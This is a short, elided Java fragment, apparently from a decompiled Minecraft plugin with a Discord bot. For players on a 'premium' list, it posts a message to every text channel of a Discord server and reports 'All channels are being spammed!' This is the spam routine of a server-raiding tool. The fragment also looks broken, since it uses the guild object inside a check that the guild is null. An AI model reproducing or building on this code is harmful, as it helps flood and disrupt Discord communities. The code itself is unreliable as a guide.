        ...
        if (plugin.premium.contains(p2.getName())) {
            if (plugin.botEnabled) {
                ...
                if (guild == null) {
                    ...
                    if (args.length <= 1) {
                        guild.getTextChannels().forEach(c2 -> c2.sendMessage((CharSequence) Settings.AUTHOR).complete());
                    } else {
                        ...
                        guild.getTextChannels().forEach(c2 -> c2.sendMessage((CharSequence)delegate).complete());
                    }
                    p2.sendMessage(Settings.PREFIX("All channels are being spammed!"));
                }
            } else {
